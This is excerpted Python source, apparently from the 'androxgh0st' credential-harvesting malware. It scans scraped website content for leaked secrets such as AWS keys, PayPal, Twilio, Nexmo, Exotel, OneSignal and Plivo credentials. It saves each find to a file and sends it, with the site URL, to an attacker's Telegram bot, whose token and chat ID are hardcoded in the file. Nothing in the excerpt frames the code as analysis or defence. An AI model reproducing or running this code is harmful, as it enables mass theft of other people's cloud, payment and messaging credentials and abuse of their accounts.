...
TELEGRAM_TOKEN = "8323998566:AAE1-WsctOwBlEf9arCTbthxdjIXUU3jmQU"
TELEGRAM_CHAT_ID = "-1003982069368"

def send_to_telegram(caption):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": f"🚀 *Hey MockingBirdZ Result Found!*\n\n{caption}",
        "parse_mode": "Markdown"
    }
    try:
...
class androxgh0st:
    def paypal(self, text, url):
        if "PAYPAL_" in text:
            ...
            save.write(url+'\n')
            save.close()
            send_to_telegram(f"💰 *PAYPAL SANDBOX*\nURL: {url}")
            return True
        else:
            return False
        ...
        try:
            if "AWS_ACCESS_KEY_ID" in text:
                ...
                if aws_key == "" and aws_sec == "":
                    ...
                    save2.write(remover+'\n\n')
                    save2.close()
                    send_to_telegram(f"☁️ *AWS KEY FOUND*\nURL: {url}\nKEY: `{aws_key}`\nSEC: `{aws_sec}`")
                return True
                ...
                if aws_key == "" and aws_sec == "":
                    ...
                    save2.write(remover+'\n\n')
                    save2.close()
                    send_to_telegram(f"☁️ *AWS SNS FOUND*\nURL: {url}\nKEY: `{aws_key}`\nDRIVER: {sms_driver}")
                return True
                ...
                if aws_key == "" and aws_sec == "":
                    ...
                    save2.write(remover+'\n\n')
                    save2.close()
                    send_to_telegram(f"☁️ *AWS S3 FOUND*\nURL: {url}\nKEY: `{aws_key}`")
                return True
                ...
                if aws_key == "" and aws_sec == "":
                    ...
                    save2.write(remover+'\n\n')
                    save2.close()
                    send_to_telegram(f"☁️ *AWS SES FOUND*\nURL: {url}\nKEY: `{aws_key}`")
                return True
                ...
                if aws_key == "" and aws_sec == "":
                    ...
                    save2.write(remover+'\n\n')
                    save2.close()
                    send_to_telegram(f"☁️ *SES KEY FOUND*\nURL: {url}\nKEY: `{aws_key}`")
                return True
            else:
                return False
        except:
    ...
    def get_twillio(self, text, url):
        try:
            if "TWILIO" in text:
                ...
                save.write(remover+'\n\n')
                save.close()
                send_to_telegram(f"📱 *TWILIO FOUND*\nURL: {url}\nSID: `{acc_sid}`\nTOKEN: `{auhtoken}`")
                return True
            else:
                return False
        except:
    ...
    def get_nexmo(self, text, url):
        try:
            if "NEXMO" in text:
                ...
                save.write(remover+'\n\n')
                save.close()
                send_to_telegram(f"💬 *NEXMO FOUND*\nURL: {url}\nKEY: `{nexmo_key}`\nSEC: `{nexmo_secret}`")
                return True
                ...
                save.write(remover+'\n\n')
                save.close()
                send_to_telegram(f"📱 *EXOTEL FOUND*\nURL: {url}\nKEY: `{exotel_api}`")
                return True
                ...
                save.write(remover+'\n\n')
                save.close()
                send_to_telegram(f"🔔 *ONESIGNAL FOUND*\nURL: {url}\nID: `{onesignal_id}`")
                return True
                ...
                save.write(remover+'\n\n')
                save.close()
                send_to_telegram(f"📞 *PLIVO FOUND*\nURL: {url}\nID: `{plivo_auth}`")
                return True
            else:
                return False
        except:
